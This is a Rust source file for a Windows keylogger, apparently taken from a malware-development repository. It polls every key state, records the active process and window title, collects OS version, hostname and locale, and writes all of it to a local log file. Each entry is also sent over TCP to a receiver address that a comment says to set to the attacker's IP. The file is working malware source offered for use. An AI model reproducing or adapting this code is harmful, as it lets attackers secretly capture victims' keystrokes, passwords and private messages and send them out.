
/*
    TCP Keylogger in Rust [Beta Version]
    For More codes https://github.com/Whitecat18/Rust-for-Malware-Development.git
    By @5mukx
*/

// On Line 50, Comment out if you need to use it in real time !

// Mention your receiver IP Here 
const ADDRESS: &str = "127.0.0.1:6969";

use std::fs::OpenOptions;
use std::net::TcpStream;
use std::{io, thread};
use std::time::Duration;
use chrono::prelude::*;
use std::io::Write;
use std::fs::File;
// use sysinfo::{System, SystemExt};
// use winver::WindowsVersion;

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("[!] {}", format!($msg,$($arg),*))
    };
}

fn header_file(file: &mut File){
    // Recieving System Information.
    // let version = WindowsVersion::detect().unwrap();
    let os_info = {
        let info = os_info::get();
        format!("OS: type: {}\nVersion: {}\n", info.os_type(), info.version())
    };
    log(file, os_info);
    let hostname_wrap = hostname::get();

    if hostname_wrap.is_ok(){
        log(file, format!("Hostname: {:?}\n",hostname_wrap.unwrap()));
    }
    else{
        log(file, format!("Hostname: {:?}\n", "NIL"));
    }
}

// log function . This is where you write your keys into file !
fn log(file: &mut File, s:String){

    // For Testing Uncomment to see the output 
    #[cfg(debug_assertions)]{
        print!("{}", s);
    }

    match file.write(s.as_bytes()){
        // Err(e) => error!("Unable to write log file, Error: {}",e),
        Err(err) => error!("[-] Unable to write key to log file, Error: {}",err),
        _ => {}
    }
    
    // Writing it for TCP ! 

    if let Err(err) = log_tcp(s.as_str()){
        error!("Failed to send data over TCP: {}",err);
        // std::process::exit(0);
    }

    match file.flush(){
        Err(err) => error!("[-]Unable to get Log Files {}",err),
        _ => {}
    }
    // Lets write tcp function


}

fn key_notes(k: u8, is_shift_or_caps: bool)-> String{
    
    // if (k >= 65 && k <= 90) || (k >= 48 && k <= 57) {
    //     // If shift is pressed, return uppercase, otherwise return lowercase
    //     if is_shift_or_caps {
    //         return format!("{}", (k as char).to_ascii_uppercase());
    //     } else {
    //         return format!("{}", (k as char).to_ascii_lowercase());
    //     }
    // } else if k >= 97 && k <= 122 {
    //     // If shift is pressed, return uppercase, otherwise return lowercase
    //     if is_shift_or_caps {
    //         return format!("{}", (k as char).to_ascii_uppercase());
    //     } else {
    //         return format!("{}", (k as char).to_ascii_lowercase());
    //     }
    // }

    // Trying something new !

    match k {
        // Alphabetic characters
        65..=90 => {
            if is_shift_or_caps {
                //return uppercase
                format!("{}", (k as char).to_ascii_uppercase())
            } else {
                // return the lowercase
                format!("{}", (k as char).to_ascii_lowercase())
            }
        }
        // Numeric characters
        48..=57 => {
            if is_shift_or_caps {
                // Special characters corresponding to numbers when Shift is pressed
                match k {
                    48 => ")", 
                    49 => "!", 
                    50 => "@", 
                    51 => "#", 
                    52 => "$", 
                    53 => "%", 
                    54 => "^", 
                    55 => "&", 
                    56 => "*", 
                    57 => "(", 
                    _ => unreachable!(),
                }
                .to_string()
            } else {
                format!("{}",(k as char))
            }
        }
        _ => {
    
    // MSDOS -> https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
    // Needs some Improvement on this special keys ... Plase be patient while i complete each one manually ;).
        match k {
            // LEFT MOUSE BUTTON
            0x01 => { "LEFT_MOUSE_BUTTON".to_string() }
            // RIGHT MOUSE BUTTON
            0x02 => { "RIGHT_MOUSE_BUTTON".to_string() }
            // Cancel
            0x03 => { "CANCEL".to_string() }
            // Middle Button (three-button mouse)
            0x04 => { "MIDDLE_MOUSE_BUTTON".to_string() }
            // X1 mouse button
            0x05 => { "X1_MOUSE_BUTTON".to_string() }
            // X2 mouse button
            0x06 => { "X2_MOUSE_BUTTON".to_string() }
            // F1 key
            0x70 => { "F1_KEY".to_string() }
            // F2 key
            0x71 => { "F2_KEY".to_string() }
            // F3 key
            0x72 => { "F3_KEY".to_string() }
            // F4 key
            0x73 => { "F4_KEY".to_string() }
            // F5 key
            0x74 => { "F5_KEY".to_string() }
            // F6 key
            0x75 => { "F6_KEY".to_string() }
            // F7 key
            0x76 => { "F7_KEY".to_string() }
            // F8 key
            0x77 => { "F8_KEY".to_string() }
            // F9 key
            0x78 => { "F9_KEY".to_string() }
            // F10 key
            0x79 => { "F10_KEY".to_string() }
            // F11 key
            0x7A => { "F11_KEY".to_string() }
            // F12 key
            0x7B => { "F12_KEY".to_string() }
            // F13 key
            0x7C => { "F13_KEY".to_string() }
            // F14 key
            0x7D => { "F14_KEY".to_string() }
            // F15 key
            0x7E => { "F15_KEY".to_string() }
            // F16 key
            0x7F => { "F16_KEY".to_string() }
            // F17 key
            0x80 => { "F17_KEY".to_string() }
            // F18 key
            0x81 => { "F18_KEY".to_string() }
            // F19 key
            0x82 => { "F19_KEY".to_string() }
            // F20 key
            0x83 => { "F20_KEY".to_string() }
            // F21 key
            0x84 => { "F21_KEY".to_string() }
            // F22 key
            0x85 => { "F22_KEY".to_string() }
            // F23 key
            0x86 => { "F23_KEY".to_string() }
            // F24 key
            0x87 => { "F24_KEY".to_string() }
            // K key
            0x08 => { "K_KEY".to_string() }
            // TAB key
            0x09 => { "TAB_KEY".to_string() }
            // CLEAR key
            0x0C => { "CLEAR_KEY".to_string() }
            // ENTER key
            0x0D => { "ENTER_KEY".to_string() }
            // SHIFT key
            0x10 => { "SHIFT_KEY".to_string() }
            // MENU key
            0x12 => { "MENU_KEY".to_string() }
            // PAUSE key
            0x13 => { "PAUSE_KEY".to_string() }
            // CAPS LOCK key
            0x14 => { "CAPS_LOCK_KEY".to_string() }
            // IME Kana mode, Hangul mode, or Hangeul mode
            0x15 => { "IME_MODE".to_string() }
            // Junja mode
            0x17 => { "JUNJA_MODE".to_string() }
            // Final mode
            0x18 => { "FINAL_MODE".to_string() }
            // IME Hanja mode or Kanji mode
            0x19 => { "IME_HANJA_KANJI_MODE".to_string() }
            // ESC key
            0x1B => { "ESC_KEY".to_string() }
            // IME convert
            0x1C => { "IME_CONVERT".to_string() }
            // IME nonconvert
            0x1D => { "IME_NONCONVERT".to_string() }
            // IME accept
            0x1E => { "IME_ACCEPT".to_string() }
            // IME mode change request
            0x1F => { "IME_MODE_CHANGE".to_string() }
            // SPACEBAR
            0x20 => { "SPACEBAR".to_string() }
            // PAGE UP key
            0x21 => { "PAGE_UP_KEY".to_string() }
            // PAGE DOWN key
            0x22 => { "PAGE_DOWN_KEY".to_string() }
            // END key
            0x23 => { "END_KEY".to_string() }
            // HOME key
            0x24 => { "HOME_KEY".to_string() }
            // LEFT ARROW key
            0x25 => { "LEFT_ARROW_KEY".to_string() }
            // UP ARROW key
            0x26 => { "UP_ARROW_KEY".to_string() }
            // RIGHT ARROW key
            0x27 => { "RIGHT_ARROW_KEY".to_string() }
            // DOWN ARROW key
            0x28 => { "DOWN_ARROW_KEY".to_string() }
            // SELECT key
            0x29 => { "SELECT_KEY".to_string() }
            // PRINT key
            0x2A => { "PRINT_KEY".to_string() }
            // EXECUTE key
            0x2B => { "EXECUTE_KEY".to_string() }
            // PRINT SCREEN key
            0x2C => { "PRINT_SCREEN_KEY".to_string() }
            // INS key
            0x2D => { "INS_KEY".to_string() }
            // DEL key
            0x2E => { "DEL_KEY".to_string() }
            // HELP key
            0x2F => { "HELP_KEY".to_string() }
            // Left Windows key (Natural keyboard)
            0x5B => { "LEFT_WINDOWS_KEY".to_string() }
            // Right Windows key (Natural keyboard)
            0x5C => { "RIGHT_WINDOWS_KEY".to_string() }
            // Applications key (Natural keyboard)
            0x5D => { "APPLICATIONS_KEY".to_string() }
            // Computer Sleep key
            0x5F => { "COMPUTER_SLEEP_KEY".to_string() }
            // Numeric keypad 0 key
            0x60 => { "NUMPAD_0_KEY".to_string() }
            // Numeric keypad 1 key
            0x61 => { "NUMPAD_1_KEY".to_string() }
            // Numeric keypad 2 key
            0x62 => { "NUMPAD_2_KEY".to_string() }
            // Numeric keypad 3 key
            0x63 => { "NUMPAD_3_KEY".to_string() }
            // Numeric keypad 4 key
            0x64 => { "NUMPAD_4_KEY".to_string() }
            // Numeric keypad 5 key
            0x65 => { "NUMPAD_5_KEY".to_string() }
            // Numeric keypad 6 key
            0x66 => { "NUMPAD_6_KEY".to_string() }
            // Numeric keypad 7 key
            0x67 => { "NUMPAD_7_KEY".to_string() }
            // Numeric keypad 8 key
            0x68 => { "NUMPAD_8_KEY".to_string() }
            // Numeric keypad 9 key
            0x69 => { "NUMPAD_9_KEY".to_string() }
            // Multiply key
            0x6A => { "MULTIPLY_KEY".to_string() }
            // Add key
            0x6B => { "ADD_KEY".to_string() }
            // Separator key
            0x6C => { "SEPARATOR_KEY".to_string() }
            // Subtract key
            0x6D => { "SUBTRACT_KEY".to_string() }
            // Decimal key
            0x6E => { "DECIMAL_KEY".to_string() }
            // Divide key
            0x6F => { "DIVIDE_KEY".to_string() }
            // NUM LOCK key
            0x90 => { "NUM_LOCK_KEY".to_string() }
            // SCROLL LOCK key
            0x91 => { "SCROLL_LOCK_KEY".to_string() }
            // Left SHIFT key
            0xA0 => { "LEFT_SHIFT_KEY".to_string() }
            // Right SHIFT key
            0xA1 => { "RIGHT_SHIFT_KEY".to_string() }
            // Left CONTROL key
            0xA2 => { "LEFT_CONTROL_KEY".to_string() }
            // Right CONTROL key
            0xA3 => { "RIGHT_CONTROL_KEY".to_string() }
            // Left MENU key
            0xA4 => { "LEFT_MENU_KEY".to_string() }
            // Right MENU key
            0xA5 => { "RIGHT_MENU_KEY".to_string() }
            // Browser Back key
            0xA6 => { "BROWSER_BACK_KEY".to_string() }
            // Browser Forward key
            0xA7 => { "BROWSER_FORWARD_KEY".to_string() }
            // Browser Refresh key
            0xA8 => { "BROWSER_REFRESH_KEY".to_string() }
            // Browser Stop key
            0xA9 => { "BROWSER_STOP_KEY".to_string() }
            // Browser Search key
            0xAA => { "BROWSER_SEARCH_KEY".to_string() }
            // Browser Favorites key
            0xAB => { "BROWSER_FAVORITES_KEY".to_string() }
            // Browser Start and Home key
            0xAC => { "BROWSER_HOME_KEY".to_string() }
            // Volume Mute key
            0xAD => { "VOLUME_MUTE_KEY".to_string() }
            // Volume Down key
            0xAE => { "VOLUME_DOWN_KEY".to_string() }
            // Volume Up key
            0xAF => { "VOLUME_UP_KEY".to_string() }
            // Next Track key
            0xB0 => { "NEXT_TRACK_KEY".to_string() }
            // Previous Track key
            0xB1 => { "PREVIOUS_TRACK_KEY".to_string() }
            // Stop Media key
            0xB2 => { "STOP_MEDIA_KEY".to_string() }
            // Play/Pause Media key
            0xB3 => { "PLAY_PAUSE_MEDIA_KEY".to_string() }
            // Start Mail key
            0xB4 => { "START_MAIL_KEY".to_string() }
            // Select Media key
            0xB5 => { "SELECT_MEDIA_KEY".to_string() }
            // Start Application 1 key
            0xB6 => { "START_APP1_KEY".to_string() }
            // Start Application 2 key
            0xB7 => { "START_APP2_KEY".to_string() }
            // Used for miscellaneous characters; it can vary by keyboard.
            0xBA => { "OEM_1_KEY".to_string() } // OEM_1_KEY
            // For any country/region, the '+' key
            0xBB => { "OEM_PLUS_KEY".to_string() }
            // For any country/region, the ',' key
            0xBC => { "OEM_COMMA_KEY".to_string() }
            // For any country/region, the '-' key
            0xBD => { "OEM_MINUS_KEY".to_string() }
            // For any country/region, the '.' key
            0xBE => { "OEM_PERIOD_KEY".to_string() }
            // Used for miscellaneous characters; it can vary by keyboard.
            0xBF => { "OEM_2_KEY".to_string() }
            // Used for miscellaneous characters; it can vary by keyboard.
            0xC0 => { "OEM_3_KEY".to_string() }
            // Used for miscellaneous characters; it can vary by keyboard.
            0xDB => { "{".to_string() }
            // Used for miscellaneous characters; it can vary by keyboard.
            0xDC => { "OEM_5_KEY".to_string() }
            // Used for miscellaneous characters; it can vary by keyboard.
            0xDD => { "}".to_string() }
            // Used for miscellaneous characters; it can vary by keyboard.
            0xDE => { " ".to_string() } // Unused
            // Used for miscellaneous characters; it can vary by keyboard.
            0xDF => { "OEM_8_KEY".to_string() }
            // OEM specific
            0xE2 => { "OEM_102_KEY".to_string() }
            // IME PROCESS key
            0xE5 => { "IME_PROCESS_KEY".to_string() }
            // Attn key
            0xF6 => { "ATTENTION_KEY".to_string() }
            // CrSel key
            0xF7 => { "CRSEL_KEY".to_string() }
            // ExSel key
            0xF8 => { "EXSEL_KEY".to_string() }
            // Erase EOF key
            0xF9 => { "ERASE_EOF_KEY".to_string() }
            // Play key
            0xFA => { "PLAY_KEY".to_string() }
            // Zoom key
            0xFB => { "ZOOM_KEY".to_string() }
            // Reserved
            0xFC => { "NO_NAME_KEY".to_string() }
            // PA1 key
            0xFD => { "PA1_KEY".to_string() }
            // Clear key
            0xFE => { "CLEAR_KEY".to_string() }
            
            // Default case for unhandled key
            _ => { format!("UNKNOWN_KEY_{}", k) }
            }
        }    
    }
}

#[allow(unused_must_use)]

fn keylog(file: &mut File){
    // we are using winapi only for this function alone so to avoid verbose, we are importing winapi's into this function only !
    //-----------------------WINAPI-------------------------//
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    use winapi::um::winnls::GetUserDefaultLocaleName;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use winapi::um::winuser::GetAsyncKeyState;
    use winapi::um::winuser::GetWindowTextLengthW;
    use winapi::um::winuser::GetWindowTextW;
    use winapi::um::winuser::GetWindowThreadProcessId;
    use winapi::shared::minwindef::DWORD;
    use winapi::ctypes::c_int;
    use winapi::um::winuser::VK_SHIFT;
    //-----------------------//////-------------------------//
    header_file(file);

    unsafe{

        let locate = {
        let length = 85;
        let mut buf = vec![0 as u16; length as usize];
        GetUserDefaultLocaleName(buf.as_mut_ptr(), length);
        let mut len = 0;
        buf.iter().enumerate().for_each(|(icm,cal)|{
            if *cal == 0 && len == 0{
                len = icm;
            }
        });

        String::from_utf16_lossy(buf[0..len].as_mut())
        };

        log(file, format!("Location: {}\n",locate));
        log(file, "\nKeylogs: \n".to_string());


        loop{
            thread::sleep(Duration::from_millis(10));
                // To recieve keyboard and mouse input 
                let hwnd = winapi::um::winuser::GetForegroundWindow();
                let pid = {
                    let mut p = 0 as DWORD;
                    GetWindowThreadProcessId(hwnd, &mut p);
                    p
                };

                let handle = OpenProcess(
                    PROCESS_QUERY_LIMITED_INFORMATION, 
                    0, 
                    pid
                );

                // getting the process name and its exec path !
                let process_path = {
                    let length = 256;
                    let mut buf: Vec<u16> = vec![0 as u16; length as usize];
                    GetProcessImageFileNameW(handle, buf.as_mut_ptr(), length);

                    let mut len = 0;
                    buf.iter().enumerate().for_each(|(icp, cen)|{
                        if *cen == 0 && len == 0{
                            len = icp;
                        }
                    });
                    
                    let path = String::from_utf16_lossy(buf[0..len].as_mut());
                    if let Some(idx) = path.rfind("\\"){
                        path[(idx + 1)..].to_string()
                    }else{
                        path
                    }
                };

                // getting title name from Window
                let title = {
                    let len = GetWindowTextLengthW(hwnd) + 1;
                    let mut t = "No_idname".to_string();

                    if len > 0{
                        let mut buf = vec![0 as u16; len as usize];
                        GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
                        buf.remove(buf.len() -1);
                        t = String::from_utf16_lossy(buf.as_mut());
                    }
                    t
                };

                let now: DateTime<Utc> = Utc::now();
                
                let is_shift_pressed = GetAsyncKeyState(VK_SHIFT) & 0x8000u16 as i16 != 0;
                // let is_caps_on = GetAsyncKeyState(VK_CAPITAL) & 0x0001u16 as i16 !=0;

                for i in 0 as c_int..255 as c_int {
                    let key = GetAsyncKeyState(i);
                    // let tcp_key = GetAsyncKeyState(i);

                    // To set the function !
                    if (key & 1) > 0 {
                        // you can remove the field if you find this unwanted info is bullshit ! 
                                                                //    :    :
                        let data = format!("[{:02}-{:02}-{:02}] |{}||{}|  ({})\n",
                                        now.hour(), now.minute(), now.second(),
                                        process_path.trim(), title.trim(), key_notes(i as u8, is_shift_pressed));

                        log(file, data);
                    }

                    // if (key & 1) > 0 {
                    //     // you can remove the field if you find this unwanted info is bullshit ! 
                    //                                             //    :    :
                    //     let s_tcp = format!("[{:02}-{:02}-{:02}] |{}||{}|  ({})\n",
                    //                     now.hour(), now.minute(), now.second(),
                    //                     process_path.trim(), title.trim(), key_notes(i as u8, is_shift_pressed));

                    //     // write some tcp functions to send the data to receiver
                        
                    //     // If you handle error here, if the receiver stops it means, the keylogger will not store the remaining logs
                    //     // on the local file ! ...

                    //     // if let Err(err) = log_tcp(s.as_str(), &ADDRESS.parse().expect("Invalid Address")){
                    //     //     error!("Failed to send the log data to the reveiver ! {}",err);
                    //     // }
                    //     // log(file, s.clone());
                    //     log_tcp(s_tcp.as_str(), &ADDRESS.parse().expect("Invalid Address"));
                    // }
                }
            }
        }    
}

// fn log_tcp(file_path: &str, ip: &str, port: u16) -> std::io::Result<()>{
//     let mut file = File::open(file_path)?;

//     let mut buffer = Vec::new();
//     file.read_to_end(&mut buffer)?;

//     let mut stream = std::net::TcpStream::connect(format!("{}:{}",ip,port))?;
//     stream.write_all(&buffer)?;
//     stream.shutdown(std::net::Shutdown::Write)?;

//     Ok(())
// }

// fn log_tcp(data: &str, receiver_addr: &SocketAddr){
//     let mut stream = TcpStream::connect(receiver_addr).expect("Unable to connect to receiver");
//     stream.write_all(data.as_bytes()).expect("Unable to Send data to the receiver");
// }

fn log_tcp(data: &str) -> io::Result<()>{
    // Gotta do my Error handeling ..! 
    // let mut stream = TcpStream::connect(ADDRESS)?;
    // stream.write_all(data.as_bytes())?;
    // stream.shutdown(std::net::Shutdown::Write)?;
    // Ok(())
    match TcpStream::connect(ADDRESS){
        Ok(mut stream) => {
            stream.write_all(data.as_bytes())?;
            stream.shutdown(std::net::Shutdown::Write)?;
            Ok(())
        }
        Err(err) => {
            eprintln!("Failed to connect to receiver: {}",err);
            Err(err)
        }
    }
}

// static key store save

fn main(){
    let filename = "keycap.log";
    // let mut output = {
    //     match OpenOptions::new().write(true).create(true).open(&filename){
    //         Ok(file) => {file}
    //         Err(e) => {
    //             error!("Coudlnt create Output file: {}",e);
    //             std::process::exit(0);
    //         }
    //     }
    // };

    let mut output = match OpenOptions::new().write(true).create(true).open(filename){
        Ok(file) => file,
        Err(err) => {
                error!("Failed to open/create local log file: {}",err);
                std::process::exit(0);            
        }
    };

    println!("Keylogger started ...");

    keylog(&mut output);
}
